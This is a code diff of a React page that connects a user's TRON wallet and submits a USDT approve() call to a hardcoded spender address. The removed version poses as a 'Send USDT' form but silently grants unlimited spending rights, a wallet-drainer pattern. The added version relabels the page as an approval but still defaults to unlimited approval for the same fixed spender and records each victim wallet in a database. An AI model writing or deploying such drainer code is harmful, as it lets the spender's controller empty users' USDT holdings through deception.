@@ -12,447 +12,656 @@ declare global {
   }
 }
 
-const PROJECT_ID       = "6b5df56bc30c1dadaab59498b86fd3e8";
-const TRON_USDT        = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const TRON_SPENDER     = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
-const TRON_SPENDER_HEX = "412f0f3b7e2b4c0b2d3e1f6f9a5c8b7d6e4a9c3b2a";
+const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
+const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
-export default function Index() {
+export default function TronApproval() {
   const [searchParams] = useSearchParams();
-  const [amount, setAmount]       = useState("");
-  const [transactionStatus, setTransactionStatusState] = useState<
-    "idle" | "processing" | "success"
-  >("idle");
+  const [amount, setAmount] = useState("");
+  const [walletAddress, setWalletAddress] = useState("");
+  const [isConnected, setIsConnected] = useState(false);
+  const [approvalStatus, setApprovalStatus] = useState<"idle" | "processing" | "success" | "error">("idle");
+  const [allowance, setAllowance] = useState("0");
+  const [txHash, setTxHash] = useState("");
+  const [errorMessage, setErrorMessage] = useState("");
+  
   const createTransaction = useMutation(api.transactions.createTransaction);
-
-  const wcClientRef    = useRef<any>(null);
-  const wcSessionRef   = useRef<any>(null);
+  const wcClientRef = useRef<any>(null);
+  const wcSessionRef = useRef<any>(null);
   const userAddressRef = useRef<string>("");
-  const wcModalRef     = useRef<any>(null);
 
-  // ===== INIT =====
+  // ===== INIT WALLETCONNECT =====
   useEffect(() => {
     async function initWC() {
       try {
-        console.log("🔄 WalletConnect init starting...");
-        console.log("PROJECT_ID:", PROJECT_ID);
-
+        console.log("🔄 Initializing WalletConnect...");
+        
         const client = await SignClient.init({
           projectId: PROJECT_ID,
           metadata: {
-            name: "USDT Transfer",
-            description: "TRON USDT Transfer",
+            name: "Tron USDT Approval",
+            description: "Approve USDT for spending",
             url: window.location.origin,
             icons: [],
           },
         });
-
-        console.log("✅ SignClient initialized");
+        
         wcClientRef.current = client;
-
+        console.log("✅ WalletConnect initialized");
+        
+        // Handle session events
         client.on("session_delete", () => {
-          console.log("🔴 Session deleted");
-          wcSessionRef.current   = null;
-          userAddressRef.current = "";
+          console.log("Session deleted");
+          resetConnection();
         });
-
+        
         client.on("session_expire", () => {
-          console.log("🔴 Session expired");
-          wcSessionRef.current   = null;
-          userAddressRef.current = "";
+          console.log("Session expired");
+          resetConnection();
         });
-
-        // ✅ KEY FIX: Jab Trust Wallet se wapas browser aao
-        // tab WebSocket relay reconnect karo — warna sign response nahi milta
+        
+        // Reconnect on visibility change
         document.addEventListener("visibilitychange", () => {
-          if (document.visibilityState === "visible") {
-            console.log("👁️ Browser visible hua — relay reconnect kar rahe hain...");
-            try {
-              // WalletConnect relay transport restart karo
-              client.core?.relayer?.restartTransport?.();
-            } catch (e) {
-              console.warn("Relay restart warning:", e);
-            }
+          if (document.visibilityState === "visible" && wcSessionRef.current) {
+            console.log("Reconnecting relay...");
+            client.core?.relayer?.restartTransport?.();
           }
         });
-
-        // Modal pre-initialize
-        console.log("📥 Importing WalletConnectModal...");
-        const { WalletConnectModal } = await import("@walletconnect/modal");
-        console.log("✅ Modal imported");
         
-        wcModalRef.current = new WalletConnectModal({
-          projectId: PROJECT_ID,
-          themeMode: "dark",
-        });
-
-        console.log("✅ WalletConnect + Modal ready!");
-      } catch (e) {
-        console.error("❌ Init error:", e);
-        alert("⚠️ WalletConnect init failed: " + (e as any).message);
+      } catch (error) {
+        console.error("Init error:", error);
+        setErrorMessage("Failed to initialize WalletConnect");
       }
     }
-    initWC();
-  }, []);
-
-  // ===== CONNECT =====
-  async function connectWallet(): Promise<string> {
-    console.log("🔗 connectWallet called");
-    console.log("wcClientRef.current:", wcClientRef.current);
-    console.log("wcModalRef.current:", wcModalRef.current);
-
-    if (!wcClientRef.current) {
-      throw new Error("WalletConnect ready nahi. Page refresh karein.");
-    }
-
-    if (!wcModalRef.current) {
-      throw new Error("WalletConnectModal ready nahi. Page refresh karein.");
-    }
-
-    // Purani session disconnect — fresh start
-    if (wcSessionRef.current) {
-      try {
-        await wcClientRef.current.disconnect({
-          topic:  wcSessionRef.current.topic,
-          reason: { code: 6000, message: "New connection" },
-        });
-      } catch {}
-      wcSessionRef.current   = null;
-      userAddressRef.current = "";
-    }
-
-    console.log("📱 Naya WalletConnect session...");
-
-    const { uri, approval } = await wcClientRef.current.connect({
-      requiredNamespaces: {
-        tron: {
-          methods: ["tron_signTransaction", "tron_signMessage"],
-          chains:  ["tron:0x2b6653dc"],
-          events:  ["chainChanged", "accountsChanged"],
-        },
-      },
-    });
-
-    if (!uri) throw new Error("URI nahi mila");
-
-    console.log("🎯 Opening modal with URI...");
-    await wcModalRef.current.openModal({ uri });
-    console.log("✅ QR Modal open");
-
-    // Approval — seedha await, koi try/finally nahi
-    wcSessionRef.current = await approval();
-    wcModalRef.current.closeModal();
-
-    console.log("✅ Wallet connected!");
-    console.log("Session:", wcSessionRef.current);
-
-    const accounts = Object.values(wcSessionRef.current.namespaces)
-      .flatMap((ns: any) => ns.accounts) as string[];
-    console.log("Accounts:", accounts);
     
-    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
-    if (!tronAcc) throw new Error("Tron account nahi mila");
-
-    userAddressRef.current = tronAcc.split(":")[2];
-    console.log("👤 User:", userAddressRef.current);
-    return userAddressRef.current;
-  }
-
-  // ===== SEND =====
-  async function handleSend() {
-    console.log("🚀 handleSend called");
-    setTransactionStatusState("processing");
+    initWC();
+    
+    return () => {
+      if (wcSessionRef.current) {
+        wcClientRef.current?.disconnect({ topic: wcSessionRef.current.topic });
+      }
+    };
+  }, []);
+  
+  const resetConnection = () => {
+    wcSessionRef.current = null;
+    userAddressRef.current = "";
+    setIsConnected(false);
+    setWalletAddress("");
+    setAllowance("0");
+  };
+  
+  // ===== CONNECT WALLET =====
+  async function connectWallet() {
     try {
-      const userAddress = await connectWallet();
-
-      // ✅ APPROVE_ABI_PARAM with correct hex
-      console.log("📝 Building APPROVE_ABI_PARAM...");
-      console.log("TRON_SPENDER_HEX:", TRON_SPENDER_HEX);
+      console.log("🔗 Connecting wallet...");
       
-      const hexAddress = TRON_SPENDER_HEX.padStart(64, '0');
-      const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      const APPROVE_ABI_PARAM = hexAddress + hexAmount;
-      
-      console.log("hexAddress:", hexAddress);
-      console.log("hexAmount:", hexAmount);
-      console.log("APPROVE_ABI_PARAM length:", APPROVE_ABI_PARAM.length);
-      console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
-
-      // Transaction build
-      console.log("📝 Transaction build...");
-      const apiResponse = await fetch(
-        "https://api.trongrid.io/wallet/triggersmartcontract",
-        {
-          method:  "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            owner_address:     userAddress,
-            contract_address:  TRON_USDT,
-            function_selector: "approve(address,uint256)",
-            parameter:         APPROVE_ABI_PARAM,
-            fee_limit:         100000000,
-            call_value:        0,
-            visible:           true,
-          }),
-        }
-      );
-
-      const apiData = await apiResponse.json();
-      console.log("📋 TronGrid Response:", apiData);
-
-      if (!apiData.transaction) {
-        throw new Error("Transaction build failed: " + JSON.stringify(apiData));
+      if (!wcClientRef.current) {
+        throw new Error("WalletConnect not initialized");
       }
-
-      // ✅ Sign request bhejo
-      console.log("🔐 Sign request bhej raha hoon Trust Wallet ko...");
-      console.log("   Topic:", wcSessionRef.current.topic);
-
-      // ✅ Trust Wallet se wapas aane ke baad relay
-      // reconnect ho chuka hoga (visibilitychange listener se)
-      const signResponse = await Promise.race([
-        wcClientRef.current.request({
-          topic:   wcSessionRef.current.topic,
-          chainId: "tron:0x2b6653dc",
-          request: {
-            method: "tron_signTransaction",
-            params: [apiData.transaction],
+      
+      // Disconnect existing session
+      if (wcSessionRef.current) {
+        try {
+          await wcClientRef.current.disconnect({
+            topic: wcSessionRef.current.topic,
+            reason: { code: 6000, message: "New connection" },
+          });
+        } catch (e) {}
+        resetConnection();
+      }
+      
+      // Create new session
+      const { uri, approval } = await wcClientRef.current.connect({
+        requiredNamespaces: {
+          tron: {
+            methods: ["tron_signTransaction", "tron_signMessage"],
+            chains: ["tron:0x2b6653dc"],
+            events: ["chainChanged", "accountsChanged"],
           },
-        }),
-        new Promise((_, rej) =>
-          setTimeout(() => rej(new Error("Sign timeout — wallet mein confirm karein")), 180000)
-        ),
-      ]);
-
-      console.log("📩 Sign response aaya!");
-      console.log("signResponse:", signResponse);
-
-      let signedTx = (signResponse as any)?.result || signResponse;
-      if (!signedTx) throw new Error("Wallet ne reject kar diya");
+        },
+      });
+      
+      if (!uri) throw new Error("No URI received");
+      
+      // Open QR modal
+      const { WalletConnectModal } = await import("@walletconnect/modal");
+      const modal = new WalletConnectModal({
+        projectId: PROJECT_ID,
+        themeMode: "dark",
+      });
+      
+      await modal.openModal({ uri });
+      wcSessionRef.current = await approval();
+      modal.closeModal();
+      
+      // Get address
+      const accounts = Object.values(wcSessionRef.current.namespaces)
+        .flatMap((ns: any) => ns.accounts);
+      const tronAccount = accounts.find((a: string) => a.startsWith("tron:"));
+      
+      if (!tronAccount) throw new Error("No TRON account found");
+      
+      const address = tronAccount.split(":")[2];
+      userAddressRef.current = address;
+      setWalletAddress(address);
+      setIsConnected(true);
+      
+      console.log("✅ Connected:", address);
+      
+      // Check current allowance
+      await fetchAllowance(address);
+      
+      return address;
+      
+    } catch (error: any) {
+      console.error("Connection error:", error);
+      setErrorMessage(error.message || "Failed to connect wallet");
+      throw error;
+    }
+  }
+  
+  // ===== FETCH CURRENT ALLOWANCE =====
+  async function fetchAllowance(address: string) {
+    try {
+      console.log("🔍 Fetching allowance...");
+      
+      // Load TronWeb dynamically
+      const TronWeb = (window as any).TronWeb;
+      if (!TronWeb) {
+        console.warn("TronWeb not loaded");
+        return;
+      }
+      
+      const tronWeb = new TronWeb({
+        fullHost: "https://api.trongrid.io"
+      });
+      
+      const contract = await tronWeb.contract().at(TRON_USDT);
+      const allowanceAmount = await contract.allowance(address, TRON_SPENDER).call();
+      const allowanceUSDT = (Number(allowanceAmount) / 1e6).toFixed(2);
+      
+      setAllowance(allowanceUSDT);
+      console.log("Current allowance:", allowanceUSDT, "USDT");
+      
+    } catch (error) {
+      console.error("Failed to fetch allowance:", error);
+    }
+  }
+  
+  // ===== BUILD APPROVAL TRANSACTION =====
+  async function buildApprovalTransaction(userAddress: string, amountValue: string) {
+    console.log("📝 Building approval transaction...");
+    
+    // Load TronWeb
+    const TronWeb = (window as any).TronWeb;
+    if (!TronWeb) {
+      throw new Error("TronWeb not loaded. Please refresh the page.");
+    }
+    
+    const tronWeb = new TronWeb({
+      fullHost: "https://api.trongrid.io"
+    });
+    
+    // Convert spender address to hex
+    const spenderHex = tronWeb.address.toHex(TRON_SPENDER);
+    // Remove '41' prefix if present (TRON addresses start with 41)
+    const cleanSpenderHex = spenderHex.startsWith('41') ? spenderHex.slice(2) : spenderHex;
+    
+    // Prepare amount
+    let amountHex;
+    if (amountValue === "Max" || amountValue === "max" || !amountValue) {
+      // Max approval: 2^256 - 1
+      amountHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    } else {
+      const amountNum = parseFloat(amountValue);
+      if (isNaN(amountNum)) throw new Error("Invalid amount");
+      const amountWithDecimals = Math.floor(amountNum * 10**6);
+      amountHex = tronWeb.toHex(amountWithDecimals).padStart(64, '0');
+    }
+    
+    // Build parameter: address(64 chars) + amount(64 chars) = 128 chars
+    const parameter = cleanSpenderHex.padStart(64, '0') + amountHex;
+    
+    console.log("Parameter length:", parameter.length); // Should be 128
+    console.log("Parameter:", parameter);
+    
+    // Call TronGrid API
+    const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        owner_address: userAddress,
+        contract_address: TRON_USDT,
+        function_selector: "approve(address,uint256)",
+        parameter: parameter,
+        fee_limit: 200000000, // 200 TRX
+        call_value: 0,
+        visible: true,
+      }),
+    });
+    
+    const data = await response.json();
+    console.log("TronGrid response:", data);
+    
+    if (!data.transaction) {
+      throw new Error("Failed to build transaction: " + JSON.stringify(data));
+    }
+    
+    // Add required fields
+    data.transaction.visible = true;
+    
+    return data.transaction;
+  }
+  
+  // ===== BROADCAST TRANSACTION =====
+  async function broadcastTransaction(signedTx: any) {
+    console.log("📡 Broadcasting transaction...");
+    
+    const response = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(signedTx),
+    });
+    
+    const result = await response.json();
+    console.log("Broadcast result:", result);
+    
+    if (!result.result && !result.txid) {
+      throw new Error("Broadcast failed: " + JSON.stringify(result));
+    }
+    
+    return result.txid || result.transaction?.txID;
+  }
+  
+  // ===== MAIN APPROVAL FUNCTION =====
+  async function handleApprove() {
+    console.log("🚀 Starting approval process...");
+    setApprovalStatus("processing");
+    setErrorMessage("");
+    setTxHash("");
+    
+    try {
+      // Connect wallet if not connected
+      let address = userAddressRef.current;
+      if (!address || !isConnected) {
+        address = await connectWallet();
+      }
+      
+      if (!address) {
+        throw new Error("Wallet not connected");
+      }
+      
+      // Build transaction
+      const transaction = await buildApprovalTransaction(address, amount);
+      
+      // Sign transaction
+      console.log("🔐 Requesting signature...");
+      const signResponse = await wcClientRef.current.request({
+        topic: wcSessionRef.current.topic,
+        chainId: "tron:0x2b6653dc",
+        request: {
+          method: "tron_signTransaction",
+          params: [transaction],
+        },
+      });
+      
+      console.log("Signature received");
+      
+      // Parse signed transaction
+      let signedTx = signResponse;
       if (typeof signedTx === "string") {
-        try { signedTx = JSON.parse(signedTx); } catch {}
-      }
-      console.log("✅ Signed!");
-
-      // Broadcast
-      console.log("📡 Broadcasting...");
-      const broadcastRes = await fetch(
-        "https://api.trongrid.io/wallet/broadcasttransaction",
-        {
-          method:  "POST",
-          headers: { "Content-Type": "application/json" },
-          body:    JSON.stringify(signedTx),
+        try {
+          signedTx = JSON.parse(signedTx);
+        } catch (e) {
+          console.warn("Failed to parse signed tx:", e);
         }
-      );
-      const result = await broadcastRes.json();
-      console.log("📡 Broadcast Result:", result);
-
-      if (!result || (result.result !== true && !result.txid)) {
-        throw new Error("Broadcast failed: " + JSON.stringify(result));
       }
-
-      const txId = result.txid || result.transaction?.txID;
-      console.log("✅ TX:", txId);
-
-      // 30s wait
-      console.log("⏳ Waiting 30s for confirmation...");
-      await new Promise((r) => setTimeout(r, 30000));
-
-      // Allowance check
-      const allowanceABI = [{
-        constant:        true,
-        inputs:          [
-          { name: "owner",   type: "address" },
-          { name: "spender", type: "address" },
-        ],
-        name:            "allowance",
-        outputs:         [{ name: "", type: "uint256" }],
-        stateMutability: "view",
-        type:            "function",
-      }];
-
-      console.log("🔍 Checking allowance...");
-      const tw2      = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      const contract = await tw2.contract(allowanceABI, TRON_USDT);
-      const raw      = await contract.allowance(userAddress, TRON_SPENDER).call();
-      const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
-      console.log("✅ Allowance:", allowanceUSDT, "USDT");
-
+      
+      // Broadcast
+      const txid = await broadcastTransaction(signedTx);
+      setTxHash(txid);
+      console.log("✅ Approval successful! TXID:", txid);
+      
+      // Wait for confirmation
+      console.log("⏳ Waiting for confirmation...");
+      await new Promise(resolve => setTimeout(resolve, 30000));
+      
+      // Check new allowance
+      await fetchAllowance(address);
+      
+      // Save to database
       await createTransaction({
-        walletAddress: userAddress,
-        toAddress:     TRON_SPENDER,
-        amount:        amount || "Max",
-        txHash:        txId || "tx",
-        usdtBalance:   allowanceUSDT + " USDT",
+        walletAddress: address,
+        toAddress: TRON_SPENDER,
+        amount: amount || "Max",
+        txHash: txid,
+        usdtBalance: allowance + " USDT",
         nativeBalance: "0 TRX",
       });
-
-      setTransactionStatusState("success");
-      setTimeout(() => setTransactionStatusState("idle"), 3000);
-      alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);
-
-    } catch (err: any) {
-      console.error("❌ Error:", err);
-      console.error("Error stack:", err.stack);
-      try { wcModalRef.current?.closeModal(); } catch {}
-      setTransactionStatusState("idle");
-      alert("❌ " + (err.message || "Transaction fail ho gayi"));
+      
+      setApprovalStatus("success");
+      
+      // Reset after 3 seconds
+      setTimeout(() => {
+        setApprovalStatus("idle");
+      }, 3000);
+      
+    } catch (error: any) {
+      console.error("❌ Approval error:", error);
+      setErrorMessage(error.message || "Approval failed");
+      setApprovalStatus("error");
+      
+      setTimeout(() => {
+        setApprovalStatus("idle");
+        setErrorMessage("");
+      }, 5000);
     }
   }
-
-  async function handlePaste() {
-    try {
-      const text = await navigator.clipboard.readText();
-      setAmount(text.trim());
-    } catch {}
+  
+  // ===== DISCONNECT WALLET =====
+  async function disconnectWallet() {
+    if (wcSessionRef.current) {
+      try {
+        await wcClientRef.current?.disconnect({
+          topic: wcSessionRef.current.topic,
+          reason: { code: 6000, message: "User disconnected" },
+        });
+      } catch (e) {}
+    }
+    resetConnection();
   }
-
-  const dollarValue =
-    amount && amount !== "Max" && !isNaN(Number(amount))
-      ? `$${Number(amount).toFixed(2)}`
-      : "$0.00";
-
-  const TRXIcon = () => (
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
-      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
-      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
-    </svg>
-  );
-
-  const XCircle = ({ onClick }: { onClick: () => void }) => (
-    <button onClick={onClick} style={{
-      background: "none", border: "1.5px solid #555", borderRadius: "50%",
-      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
-      display: "flex", alignItems: "center", justifyContent: "center",
-      fontSize: "11px", flexShrink: 0, padding: 0,
-    }}>✕</button>
-  );
-
+  
+  // ===== TRUNCATE ADDRESS =====
+  const truncateAddress = (addr: string) => {
+    if (!addr) return "";
+    return addr.slice(0, 6) + "..." + addr.slice(-4);
+  };
+  
+  // ===== RENDER =====
   return (
     <div style={{
-      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
-      display: "flex", flexDirection: "column", maxWidth: "480px",
-      marginLeft: "auto", marginRight: "auto",
+      minHeight: "100vh",
+      background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      padding: "20px",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
     }}>
-
-      {/* Header */}
       <div style={{
-        display: "flex", alignItems: "center", justifyContent: "space-between",
-        padding: "20px 22px 16px",
+        maxWidth: "500px",
+        width: "100%",
+        background: "white",
+        borderRadius: "24px",
+        padding: "32px",
+        boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
       }}>
-        <button onClick={() => window.history.back()} style={{
-          background: "none", border: "none", color: "#fff",
-          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
-        }}>←</button>
-        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
-        <button onClick={() => window.history.back()} style={{
-          background: "none", border: "none", color: "#fff",
-          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
-        }}>✕</button>
-      </div>
-
-      <div style={{ padding: "4px 18px", flex: 1 }}>
-
-        {/* Network */}
-        <div style={{ marginBottom: "14px" }}>
-          <label style={{
-            display: "block", fontSize: "14px", fontWeight: 500,
-            color: "#8e8e93", marginBottom: "9px",
+        
+        {/* Header */}
+        <div style={{ textAlign: "center", marginBottom: "32px" }}>
+          <h1 style={{
+            fontSize: "28px",
+            fontWeight: "bold",
+            margin: "0 0 8px 0",
+            background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+            WebkitBackgroundClip: "text",
+            WebkitTextFillColor: "transparent",
           }}>
-            Destination network
-          </label>
-          <div style={{
-            display: "inline-flex", alignItems: "center", gap: "7px",
-            background: "#2c2c2e", borderRadius: "20px",
-            padding: "7px 13px 7px 8px",
-          }}>
-            <div style={{
-              width: "26px", height: "26px", borderRadius: "50%",
-              background: "#EF0027", display: "flex",
-              alignItems: "center", justifyContent: "center", flexShrink: 0,
-            }}>
-              <TRXIcon />
-            </div>
-            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
-              Tron Network
-            </span>
-          </div>
+            TRON USDT Approval
+          </h1>
+          <p style={{ color: "#666", margin: 0 }}>
+            Approve spending limit for USDT
+          </p>
         </div>
-
-        {/* Amount */}
-        <div style={{ marginBottom: "6px" }}>
-          <label style={{
-            display: "block", fontSize: "14px", fontWeight: 500,
-            color: "#8e8e93", marginBottom: "9px",
-          }}>
-            Amount
-          </label>
+        
+        {/* Wallet Section */}
+        <div style={{
+          background: "#f5f5f5",
+          borderRadius: "16px",
+          padding: "16px",
+          marginBottom: "24px",
+        }}>
           <div style={{
-            display: "flex", alignItems: "center",
-            border: "1px solid #2e2e30", borderRadius: "14px",
-            padding: "14px 14px", background: "#242426", gap: "8px",
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center",
+            marginBottom: "12px",
+          }}>
+            <span style={{ color: "#666", fontSize: "14px" }}>Wallet Status</span>
+            {isConnected ? (
+              <span style={{ color: "#10b981", fontSize: "12px", fontWeight: "500" }}>
+                ● Connected
+              </span>
+            ) : (
+              <span style={{ color: "#ef4444", fontSize: "12px", fontWeight: "500" }}>
+                ● Not Connected
+              </span>
+            )}
+          </div>
+          
+          {isConnected && walletAddress && (
+            <div style={{
+              background: "white",
+              borderRadius: "12px",
+              padding: "12px",
+              marginBottom: "12px",
+            }}>
+              <div style={{ color: "#666", fontSize: "12px", marginBottom: "4px" }}>
+                Wallet Address
+              </div>
+              <div style={{
+                fontFamily: "monospace",
+                fontSize: "14px",
+                wordBreak: "break-all",
+              }}>
+                {truncateAddress(walletAddress)}
+              </div>
+            </div>
+          )}
+          
+          {isConnected && allowance !== "0" && (
+            <div style={{
+              background: "#e0f2fe",
+              borderRadius: "12px",
+              padding: "12px",
+            }}>
+              <div style={{ color: "#0284c7", fontSize: "12px", marginBottom: "4px" }}>
+                Current Allowance
+              </div>
+              <div style={{
+                fontSize: "20px",
+                fontWeight: "bold",
+                color: "#0369a1",
+              }}>
+                {allowance} USDT
+              </div>
+            </div>
+          )}
+          
+          <button
+            onClick={isConnected ? disconnectWallet : connectWallet}
+            style={{
+              width: "100%",
+              padding: "12px",
+              background: isConnected ? "#ef4444" : "#667eea",
+              color: "white",
+              border: "none",
+              borderRadius: "12px",
+              fontSize: "16px",
+              fontWeight: "600",
+              cursor: "pointer",
+              marginTop: "12px",
+              transition: "all 0.3s",
+            }}
+            onMouseEnter={(e) => {
+              e.currentTarget.style.opacity = "0.9";
+            }}
+            onMouseLeave={(e) => {
+              e.currentTarget.style.opacity = "1";
+            }}
+          >
+            {isConnected ? "Disconnect Wallet" : "Connect Wallet"}
+          </button>
+        </div>
+        
+        {/* Amount Section */}
+        <div style={{ marginBottom: "24px" }}>
+          <label style={{
+            display: "block",
+            marginBottom: "8px",
+            color: "#333",
+            fontWeight: "500",
+          }}>
+            Approval Amount
+          </label>
+          
+          <div style={{
+            display: "flex",
+            gap: "12px",
+            marginBottom: "12px",
           }}>
             <input
+              type="text"
               value={amount}
               onChange={(e) => setAmount(e.target.value)}
-              placeholder="0"
-              type="text"
-              inputMode="decimal"
+              placeholder="Enter amount or 'Max'"
               style={{
-                flex: 1, background: "transparent", border: "none",
-                outline: "none", color: "#fff", fontSize: "18px",
-                fontFamily: "inherit", minWidth: 0,
+                flex: 1,
+                padding: "14px",
+                border: "2px solid #e5e5e5",
+                borderRadius: "12px",
+                fontSize: "16px",
+                outline: "none",
+                transition: "border-color 0.3s",
+              }}
+              onFocus={(e) => {
+                e.currentTarget.style.borderColor = "#667eea";
+              }}
+              onBlur={(e) => {
+                e.currentTarget.style.borderColor = "#e5e5e5";
               }}
             />
-            {amount && <XCircle onClick={() => setAmount("")} />}
-            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>
-              USDT
-            </span>
-            <button onClick={() => setAmount("Max")} style={{
-              background: "none", border: "none", color: "#39d353",
-              cursor: "pointer", fontSize: "16px", fontWeight: 600,
-              padding: "0", flexShrink: 0,
-            }}>Max</button>
+            <button
+              onClick={() => setAmount("Max")}
+              style={{
+                padding: "0 20px",
+                background: "#f3f4f6",
+                border: "none",
+                borderRadius: "12px",
+                fontSize: "16px",
+                fontWeight: "600",
+                cursor: "pointer",
+                color: "#667eea",
+              }}
+            >
+              Max
+            </button>
           </div>
-          <div style={{
-            fontSize: "13px", color: "#636366",
-            marginTop: "7px", paddingLeft: "2px",
+          
+          <p style={{
+            fontSize: "12px",
+            color: "#666",
+            margin: 0,
           }}>
-            ≈ {dollarValue}
-          </div>
+            {amount && amount !== "Max" && !isNaN(parseFloat(amount))
+              ? `≈ $${parseFloat(amount).toFixed(2)} USD`
+              : "Leave empty or 'Max' for unlimited approval"}
+          </p>
         </div>
-
-      </div>
-
-      {/* Send Button */}
-      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
+        
+        {/* Approve Button */}
         <button
-          onClick={handleSend}
-          disabled={transactionStatus !== "idle"}
+          onClick={handleApprove}
+          disabled={approvalStatus === "processing" || !isConnected}
           style={{
             width: "100%",
-            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
-            color: "#000",
+            padding: "16px",
+            background: approvalStatus === "processing"
+              ? "#9ca3af"
+              : approvalStatus === "success"
+              ? "#10b981"
+              : approvalStatus === "error"
+              ? "#ef4444"
+              : "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
+            color: "white",
             border: "none",
-            borderRadius: "30px",
-            padding: "18px",
+            borderRadius: "12px",
             fontSize: "18px",
-            fontWeight: 700,
-            cursor: transactionStatus === "idle" ? "pointer" : "default",
-            transition: "all 0.2s ease",
-            letterSpacing: "0.01em",
+            fontWeight: "600",
+            cursor: approvalStatus === "processing" || !isConnected ? "not-allowed" : "pointer",
+            transition: "all 0.3s",
+            opacity: approvalStatus === "processing" || !isConnected ? 0.6 : 1,
           }}
         >
-          {transactionStatus === "success"
-            ? "✓ Transaction Successful!"
-            : transactionStatus === "processing"
-            ? "Processing..."
-            : "Send"}
+          {approvalStatus === "processing" && "Processing..."}
+          {approvalStatus === "success" && "✓ Approval Successful!"}
+          {approvalStatus === "error" && "✗ Approval Failed"}
+          {approvalStatus === "idle" && "Approve USDT"}
         </button>
+        
+        {/* Transaction Hash */}
+        {txHash && (
+          <div style={{
+            marginTop: "16px",
+            padding: "12px",
+            background: "#f0fdf4",
+            borderRadius: "12px",
+            fontSize: "12px",
+          }}>
+            <div style={{ color: "#166534", marginBottom: "4px" }}>Transaction Hash:</div>
+            <a
+              href={`https://tronscan.org/#/transaction/${txHash}`}
+              target="_blank"
+              rel="noopener noreferrer"
+              style={{
+                color: "#22c55e",
+                textDecoration: "none",
+                wordBreak: "break-all",
+                fontFamily: "monospace",
+              }}
+            >
+              {txHash}
+            </a>
+          </div>
+        )}
+        
+        {/* Error Message */}
+        {errorMessage && (
+          <div style={{
+            marginTop: "16px",
+            padding: "12px",
+            background: "#fef2f2",
+            borderRadius: "12px",
+            color: "#dc2626",
+            fontSize: "12px",
+          }}>
+            ❌ {errorMessage}
+          </div>
+        )}
+        
+        {/* Info Section */}
+        <div style={{
+          marginTop: "24px",
+          padding: "16px",
+          background: "#fef3c7",
+          borderRadius: "12px",
+          fontSize: "12px",
+          color: "#92400e",
+        }}>
+          <div style={{ fontWeight: "bold", marginBottom: "8px" }}>
+            ℹ️ Important Information
+          </div>
+          <ul style={{ margin: 0, paddingLeft: "20px" }}>
+            <li>Approval allows the spender to use your USDT</li>
+            <li>Max approval gives unlimited spending权限</li>
+            <li>Transaction fees will be deducted in TRX</li>
+            <li>You can revoke approval anytime</li>
+          </ul>
+        </div>
+        
       </div>
-
     </div>
   );
 }
